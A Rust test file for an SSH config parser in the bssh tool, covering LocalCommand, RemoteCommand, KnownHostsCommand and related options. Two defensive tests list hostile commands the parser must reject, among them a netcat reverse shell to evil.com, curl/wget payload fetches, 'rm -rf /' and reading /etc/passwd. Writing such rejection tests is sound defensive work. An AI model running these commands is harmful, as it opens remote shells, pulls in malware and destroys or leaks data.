// Copyright 2025 Lablup Inc. and Jeongkyu Shin
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

use bssh::ssh::ssh_config::SshConfig;

#[test]
fn test_parse_permit_local_command() {
    let config = r#"
Host test1
    PermitLocalCommand yes

Host test2
    PermitLocalCommand no

Host test3
    PermitLocalCommand true

Host test4
    PermitLocalCommand false
"#;

    let config_parsed = SshConfig::parse(config).unwrap();
    let hosts = config_parsed.hosts;
    assert_eq!(hosts.len(), 4);

    assert_eq!(hosts[0].permit_local_command, Some(true));
    assert_eq!(hosts[1].permit_local_command, Some(false));
    assert_eq!(hosts[2].permit_local_command, Some(true));
    assert_eq!(hosts[3].permit_local_command, Some(false));
}

#[test]
fn test_parse_local_command() {
    let config = r#"
Host test1
    PermitLocalCommand yes
    LocalCommand rsync -av ~/project/ %h:~/project/

Host test2
    LocalCommand notify-send "Connected to %h on port %p"

Host test3
    LocalCommand /usr/local/bin/script %u@%r:%p

Host test4
    LocalCommand echo "Hostname: %h, %H, Original: %n, Port: %p, User: %r, Local: %u"

Host test5
    LocalCommand echo "Literal percent: %% done"
"#;

    let config_parsed = SshConfig::parse(config).unwrap();
    let hosts = config_parsed.hosts;
    assert_eq!(hosts.len(), 5);

    assert_eq!(
        hosts[0].local_command,
        Some("rsync -av ~/project/ %h:~/project/".to_string())
    );
    assert_eq!(
        hosts[1].local_command,
        Some("notify-send \"Connected to %h on port %p\"".to_string())
    );
    assert_eq!(
        hosts[2].local_command,
        Some("/usr/local/bin/script %u@%r:%p".to_string())
    );
    assert_eq!(
        hosts[3].local_command,
        Some("echo \"Hostname: %h, %H, Original: %n, Port: %p, User: %r, Local: %u\"".to_string())
    );
    assert_eq!(
        hosts[4].local_command,
        Some("echo \"Literal percent: %% done\"".to_string())
    );
}

#[test]
fn test_parse_local_command_security() {
    // Commands with dangerous patterns should fail
    let dangerous_commands = vec![
        "LocalCommand echo test; rm -rf /",
        "LocalCommand echo $(whoami)",
        "LocalCommand echo `date`",
        "LocalCommand echo test | grep foo",
        "LocalCommand echo test > /tmp/out",
        "LocalCommand echo test & echo background",
        "LocalCommand curl https://evil.com/malware -o /tmp/malware",
        "LocalCommand wget https://evil.com/steal-data",
        "LocalCommand nc -e /bin/sh evil.com 1234",
        "LocalCommand rm -rf /important/data",
    ];

    for cmd in dangerous_commands {
        let config = format!("Host test\n    {cmd}\n");
        assert!(
            SshConfig::parse(&config).is_err(),
            "Should reject dangerous command: {cmd}"
        );
    }
}

#[test]
fn test_parse_local_command_invalid_tokens() {
    // Commands with invalid tokens should fail
    let invalid_tokens = vec![
        "LocalCommand echo %x", // Invalid token
        "LocalCommand echo %1", // Invalid token
        "LocalCommand echo %",  // Incomplete token
    ];

    for cmd in invalid_tokens {
        let config = format!("Host test\n    {cmd}\n");
        let result = SshConfig::parse(&config);
        assert!(
            result.is_err(),
            "Should reject invalid token in command: {cmd}"
        );
    }
}

#[test]
fn test_parse_remote_command() {
    let config = r#"
Host test1
    RemoteCommand tmux attach -t dev || tmux new -s dev

Host test2
    RemoteCommand cd /srv/project && exec zsh

Host test3
    RemoteCommand /usr/local/bin/backup.sh --verbose

Host test4
    RemoteCommand echo "Complex command with | and & and ;"
"#;

    let config_parsed = SshConfig::parse(config).unwrap();
    let hosts = config_parsed.hosts;
    assert_eq!(hosts.len(), 4);

    assert_eq!(
        hosts[0].remote_command,
        Some("tmux attach -t dev || tmux new -s dev".to_string())
    );
    assert_eq!(
        hosts[1].remote_command,
        Some("cd /srv/project && exec zsh".to_string())
    );
    assert_eq!(
        hosts[2].remote_command,
        Some("/usr/local/bin/backup.sh --verbose".to_string())
    );
    // RemoteCommand doesn't validate content since it runs on remote
    assert_eq!(
        hosts[3].remote_command,
        Some("echo \"Complex command with | and & and ;\"".to_string())
    );
}

#[test]
fn test_parse_known_hosts_command() {
    let config = r#"
Host test1
    KnownHostsCommand /usr/local/bin/fetch-host-key %H

Host test2
    KnownHostsCommand /opt/scripts/get_key.sh %h

Host test3
    KnownHostsCommand /usr/bin/ssh-keyscan -H %H
"#;

    let config_parsed = SshConfig::parse(config).unwrap();
    let hosts = config_parsed.hosts;
    assert_eq!(hosts.len(), 3);

    assert_eq!(
        hosts[0].known_hosts_command,
        Some("/usr/local/bin/fetch-host-key %H".to_string())
    );
    assert_eq!(
        hosts[1].known_hosts_command,
        Some("/opt/scripts/get_key.sh %h".to_string())
    );
    assert_eq!(
        hosts[2].known_hosts_command,
        Some("/usr/bin/ssh-keyscan -H %H".to_string())
    );
}

#[test]
fn test_parse_known_hosts_command_security() {
    // KnownHostsCommand with dangerous patterns should fail
    let dangerous_commands = vec![
        "KnownHostsCommand echo test; cat /etc/passwd",
        "KnownHostsCommand echo $(whoami)",
        "KnownHostsCommand echo test | tee /tmp/log",
        "KnownHostsCommand curl -s https://evil.com/hostkey",
        "KnownHostsCommand wget https://evil.com/malware",
        "KnownHostsCommand nc evil.com 1234",
    ];

    for cmd in dangerous_commands {
        let config = format!("Host test\n    {cmd}\n");
        assert!(
            SshConfig::parse(&config).is_err(),
            "Should reject dangerous KnownHostsCommand: {cmd}"
        );
    }
}

#[test]
fn test_parse_fork_after_authentication() {
    let config = r#"
Host test1
    ForkAfterAuthentication yes

Host test2
    ForkAfterAuthentication no

Host test3
    ForkAfterAuthentication true

Host test4
    ForkAfterAuthentication false
"#;

    let config_parsed = SshConfig::parse(config).unwrap();
    let hosts = config_parsed.hosts;
    assert_eq!(hosts.len(), 4);

    assert_eq!(hosts[0].fork_after_authentication, Some(true));
    assert_eq!(hosts[1].fork_after_authentication, Some(false));
    assert_eq!(hosts[2].fork_after_authentication, Some(true));
    assert_eq!(hosts[3].fork_after_authentication, Some(false));
}

#[test]
fn test_parse_session_type() {
    let config = r#"
Host test1
    SessionType none

Host test2
    SessionType subsystem

Host test3
    SessionType default

Host test4
    SessionType NONE

Host test5
    SessionType SubSystem
"#;

    let config_parsed = SshConfig::parse(config).unwrap();
    let hosts = config_parsed.hosts;
    assert_eq!(hosts.len(), 5);

    assert_eq!(hosts[0].session_type, Some("none".to_string()));
    assert_eq!(hosts[1].session_type, Some("subsystem".to_string()));
    assert_eq!(hosts[2].session_type, Some("default".to_string()));
    // Case insensitive
    assert_eq!(hosts[3].session_type, Some("none".to_string()));
    assert_eq!(hosts[4].session_type, Some("subsystem".to_string()));
}

#[test]
fn test_parse_session_type_invalid() {
    let invalid_values = vec![
        "SessionType invalid",
        "SessionType shell",
        "SessionType exec",
        "SessionType pty",
    ];

    for cmd in invalid_values {
        let config = format!("Host test\n    {cmd}\n");
        assert!(
            SshConfig::parse(&config).is_err(),
            "Should reject invalid SessionType value: {cmd}"
        );
    }
}

#[test]
fn test_parse_stdin_null() {
    let config = r#"
Host test1
    StdinNull yes

Host test2
    StdinNull no

Host test3
    StdinNull true

Host test4
    StdinNull false
"#;

    let config_parsed = SshConfig::parse(config).unwrap();
    let hosts = config_parsed.hosts;
    assert_eq!(hosts.len(), 4);

    assert_eq!(hosts[0].stdin_null, Some(true));
    assert_eq!(hosts[1].stdin_null, Some(false));
    assert_eq!(hosts[2].stdin_null, Some(true));
    assert_eq!(hosts[3].stdin_null, Some(false));
}

#[test]
fn test_parse_command_options_combined() {
    let config = r#"
Host dev-server
    PermitLocalCommand yes
    LocalCommand rsync -av ~/project/ %h:~/project/
    RemoteCommand cd /srv/app && exec zsh
    ForkAfterAuthentication no
    SessionType default
    StdinNull no

Host background-job
    PermitLocalCommand yes
    LocalCommand notify-send "Starting background job on %h"
    RemoteCommand /usr/local/bin/long-running-task.sh
    ForkAfterAuthentication yes
    SessionType none
    StdinNull yes

Host fetch-keys
    KnownHostsCommand /usr/local/bin/fetch-host-key %H
    PermitLocalCommand no
"#;

    let config_parsed = SshConfig::parse(config).unwrap();
    let hosts = config_parsed.hosts;
    assert_eq!(hosts.len(), 3);

    // dev-server
    assert_eq!(hosts[0].permit_local_command, Some(true));
    assert_eq!(
        hosts[0].local_command,
        Some("rsync -av ~/project/ %h:~/project/".to_string())
    );
    assert_eq!(
        hosts[0].remote_command,
        Some("cd /srv/app && exec zsh".to_string())
    );
    assert_eq!(hosts[0].fork_after_authentication, Some(false));
    assert_eq!(hosts[0].session_type, Some("default".to_string()));
    assert_eq!(hosts[0].stdin_null, Some(false));

    // background-job
    assert_eq!(hosts[1].permit_local_command, Some(true));
    assert_eq!(
        hosts[1].local_command,
        Some("notify-send \"Starting background job on %h\"".to_string())
    );
    assert_eq!(
        hosts[1].remote_command,
        Some("/usr/local/bin/long-running-task.sh".to_string())
    );
    assert_eq!(hosts[1].fork_after_authentication, Some(true));
    assert_eq!(hosts[1].session_type, Some("none".to_string()));
    assert_eq!(hosts[1].stdin_null, Some(true));

    // fetch-keys
    assert_eq!(
        hosts[2].known_hosts_command,
        Some("/usr/local/bin/fetch-host-key %H".to_string())
    );
    assert_eq!(hosts[2].permit_local_command, Some(false));
}

#[test]
fn test_parse_options_case_insensitive() {
    let config = r#"
Host test
    permitlocalcommand yes
    LOCALCOMMAND echo test
    RemoteCommand echo test
    KNOWNHOSTSCOMMAND /bin/echo %h
    forkafterauthentication NO
    SessionType DEFAULT
    stdinnull FALSE
"#;

    let config_parsed = SshConfig::parse(config).unwrap();
    let hosts = config_parsed.hosts;
    assert_eq!(hosts.len(), 1);

    assert_eq!(hosts[0].permit_local_command, Some(true));
    assert_eq!(hosts[0].local_command, Some("echo test".to_string()));
    assert_eq!(hosts[0].remote_command, Some("echo test".to_string()));
    assert_eq!(
        hosts[0].known_hosts_command,
        Some("/bin/echo %h".to_string())
    );
    assert_eq!(hosts[0].fork_after_authentication, Some(false));
    assert_eq!(hosts[0].session_type, Some("default".to_string()));
    assert_eq!(hosts[0].stdin_null, Some(false));
}

#[test]
fn test_parse_empty_values_error() {
    let empty_configs = vec![
        "Host test\n    PermitLocalCommand\n",
        "Host test\n    LocalCommand\n",
        "Host test\n    RemoteCommand\n",
        "Host test\n    KnownHostsCommand\n",
        "Host test\n    ForkAfterAuthentication\n",
        "Host test\n    SessionType\n",
        "Host test\n    StdinNull\n",
    ];

    for config in empty_configs {
        assert!(
            SshConfig::parse(config).is_err(),
            "Should reject empty value for: {config}"
        );
    }
}

#[test]
fn test_parse_whitespace_command() {
    // LocalCommand and KnownHostsCommand with only whitespace should fail
    let whitespace_configs = vec![
        "Host test\n    LocalCommand   \n",
        "Host test\n    LocalCommand \t\n",
        "Host test\n    KnownHostsCommand   \n",
    ];

    for config in whitespace_configs {
        assert!(
            SshConfig::parse(config).is_err(),
            "Should reject whitespace-only command: {config}"
        );
    }

    // RemoteCommand with only whitespace should be rejected (no actual command)
    let config = "Host test\n    RemoteCommand   \n";
    assert!(
        SshConfig::parse(config).is_err(),
        "Should reject RemoteCommand with only whitespace"
    );
}

#[test]
fn test_parse_command_with_equals() {
    // Test Option=Value syntax (Phase 1 compatibility)
    let config = r#"
Host test
    PermitLocalCommand=yes
    LocalCommand=rsync -av %h:/tmp/ /tmp/
    RemoteCommand=tmux attach
    KnownHostsCommand=/usr/bin/fetch-key %H
    ForkAfterAuthentication=no
    SessionType=none
    StdinNull=yes
"#;

    let config_parsed = SshConfig::parse(config).unwrap();
    let hosts = config_parsed.hosts;
    assert_eq!(hosts.len(), 1);

    assert_eq!(hosts[0].permit_local_command, Some(true));
    assert_eq!(
        hosts[0].local_command,
        Some("rsync -av %h:/tmp/ /tmp/".to_string())
    );
    assert_eq!(hosts[0].remote_command, Some("tmux attach".to_string()));
    assert_eq!(
        hosts[0].known_hosts_command,
        Some("/usr/bin/fetch-key %H".to_string())
    );
    assert_eq!(hosts[0].fork_after_authentication, Some(false));
    assert_eq!(hosts[0].session_type, Some("none".to_string()));
    assert_eq!(hosts[0].stdin_null, Some(true));
}
